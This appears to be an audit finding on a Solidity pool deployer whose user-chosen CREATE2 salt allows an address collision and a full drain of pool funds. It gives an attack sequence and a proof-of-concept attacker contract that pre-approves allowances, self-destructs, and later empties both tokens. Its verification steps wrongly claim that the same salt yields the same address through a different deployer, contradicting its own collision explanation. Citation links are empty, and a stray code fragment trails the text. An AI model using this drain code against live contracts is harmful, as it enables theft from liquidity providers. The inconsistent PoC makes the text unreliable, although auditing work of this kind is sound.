### Title
User-Controlled `CREATE2` Salt in Pool Deployment Enables Address Collision and Complete Pool Drain - (`metric-core/contracts/MetricOmmPoolDeployer.sol`)

---

### Summary

`MetricOmmPoolDeployer.deploy()` uses a user-supplied `salt` in a `CREATE2` deployment of `MetricOmmPool`. An attacker can brute-force a collision between an undeployed pool address and an attacker-controlled contract, pre-set infinite ERC-20 allowances on the collided address via a self-destructing contract, and then drain the pool after it is legitimately deployed there. All configured extension guards (allowlists, stop-loss, velocity guards) are bypassed because the drain occurs via a direct `transferFrom` at the ERC-20 layer, never touching the pool's hook system.

---

### Finding Description

In `MetricOmmPoolFactory.createPool`, the caller supplies `params.salt` freely: [1](#0-0) 

That salt is forwarded verbatim to the deployer: [2](#0-1) 

Inside `deploy`, the pool is created with:

```solidity
pool = address(
  new MetricOmmPool{salt: params.salt}( ... )
);
``` [3](#0-2) 

The resulting `CREATE2` address is fully determined by:

```
keccak256(0xff ++ deployer_address ++ salt ++ keccak256(MetricOmmPool_initcode))
```

Because `salt` is the only variable the attacker controls (deployer address and initcode are fixed and public), the attacker can enumerate `2^80` salt values, store the resulting pool addresses in a Bloom filter, and simultaneously brute-force `CREATE2` addresses for an attacker-controlled wallet contract until a collision is found. This is the standard meet-in-the-middle technique documented in EIP-3607 and multiple prior audit findings.

**Attack sequence:**

**Tx 1** (before any pool exists at the collided address):
1. Deploy an attack contract to `0xCOLLIDED` via `CREATE2`.
2. Inside the attack contract's constructor, call `token0.approve(attacker, type(uint256).max)` and `token1.approve(attacker, type(uint256).max)`.
3. `selfdestruct` the contract in the same transaction (valid post-Dencun per EIP-6780 when created in the same tx).

Result: `0xCOLLIDED` has no code, but the ERC-20 allowance mapping for `attacker` is set to `type(uint256).max`.

**Tx 2:**
4. Call `MetricOmmPoolFactory.createPool(...)` with the colliding salt. The factory deploys `MetricOmmPool` to `0xCOLLIDED`.
5. Extensions are initialized (allowlists, guards, etc.) — but the allowance already exists in the token contracts' storage, completely outside the pool's control.

**Tx 3+:**
6. Wait for LPs to deposit into the pool.
7. Call `token0.transferFrom(0xCOLLIDED, attacker, balance)` and `token1.transferFrom(...)` — the pre-set allowance is consumed, draining the pool.

The extension hook system (`_beforeSwap`, `_afterSwap`, `_beforeAddLiquidity`, etc.) is never invoked because the drain bypasses the pool contract entirely. [4](#0-3) 

---

### Impact Explanation

Any `MetricOmmPool` deployed with a salt chosen by the attacker can be completely drained of all `token0` and `token1` balances. This includes LP principal, accrued fees, and any protocol-owned liquidity. The attacker can target a specific pool by choosing the salt, wait for sufficient deposits, and then execute the drain in a single transaction. All extension guards — `SwapAllowlistExtension`, `DepositAllowlistExtension`, `OracleValueStopLossExtension`, `PriceVelocityGuardExtension` — are irrelevant because the theft never calls any pool function.

Severity: **Medium** (matching the external report's classification), because:
- The computational cost is high (~`2^80` hashes) but feasible with modern hardware/cloud compute.
- The attacker must wait for deposits to accumulate, making the attack economically rational only for high-TVL pools.
- Any pool whose salt was attacker-chosen is permanently at risk.

---

### Likelihood Explanation

- The `salt` parameter is fully user-controlled with no restrictions in `createPool`.
- The deployer address and `MetricOmmPool` initcode are public and fixed, making the preimage set for (1) fully computable offline.
- The BTC network alone performs `~6.5 × 10^20` hashes/second; `2^80 ≈ 1.2 × 10^24` hashes requires only ~30 minutes at full BTC hashrate, or days/weeks with a fraction of that power.
- The attacker can choose any pool they wish to target by selecting the salt.

---

### Recommendation

1. **Remove user control over the salt.** Derive the salt internally from parameters that cannot be predicted or chosen by the attacker:

```solidity
bytes32 salt = keccak256(abi.encode(
    params.token0,
    params.token1,
    params.priceProvider,
    msg.sender,
    block.timestamp,
    block.number,
    nextPoolIdx
));
```

2. **Include `block.timestamp` and `block.number`** so that even if a collision is found, the attacker must execute at a specific block, requiring sequencer collusion.

3. **Include `msg.sender` (the pool creator)** so the collision search space is per-sender, not global.

4. **Include `nextPoolIdx`** (already tracked by the factory) as an additional entropy source that is unpredictable at collision-search time. [5](#0-4)

### Proof of Concept

The following demonstrates the two EVM properties that make this attack possible (adapted from the referenced Panoptic PoC):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AttackSetup {
    address immutable token0;
    address immutable token1;
    address immutable attacker;

    constructor(address _token0, address _token1, address _attacker) {
        token0 = _token0;
        token1 = _token1;
        attacker = _attacker;
        // Step 2: set infinite allowance while deployed at 0xCOLLIDED
        IERC20(token0).approve(attacker, type(uint256).max);
        IERC20(token1).approve(attacker, type(uint256).max);
        // Step 3: selfdestruct in same tx (EIP-6780 compliant)
        selfdestruct(payable(attacker));
    }
}

contract Attacker {
    // Step 1: deploy AttackSetup to 0xCOLLIDED
    function step1(bytes32 collidingSalt, address token0, address token1) external {
        new AttackSetup{salt: collidingSalt}(token0, token1, address(this));
        // After this tx: 0xCOLLIDED has no code, but allowance[0xCOLLIDED][this] = max
    }

    // Step 3: after pool is deployed to 0xCOLLIDED and has deposits
    function step3(address collidedPool, address token0, address token1) external {
        uint256 bal0 = IERC20(token0).balanceOf(collidedPool);
        uint256 bal1 = IERC20(token1).balanceOf(collidedPool);
        IERC20(token0).transferFrom(collidedPool, address(this), bal0);
        IERC20(token1).transferFrom(collidedPool, address(this), bal1);
    }
}
```

**Verification steps:**
1. Deploy `Attacker`.
2. Call `step1` with the colliding salt — record the deployed-then-destroyed address.
3. Call `MetricOmmPoolFactory.createPool` with the same salt — pool deploys to the same address.
4. Have LPs add liquidity to the pool.
5. Call `step3` — both token balances are transferred out without any pool hook being invoked. [2](#0-1) [6](#0-5)

  function _callExtensionsInOrder(uint256 order, bytes memory data) private {
    if (order == 0) return;

    while (true) {
      uint256 extensionIndex = order & 0x7;
      if (extensionIndex == 0) break;
      address extension = _extensionAddress(extensionIndex);

      CallExtension.callExtension(extension, data);
      order >>= 3;
    }
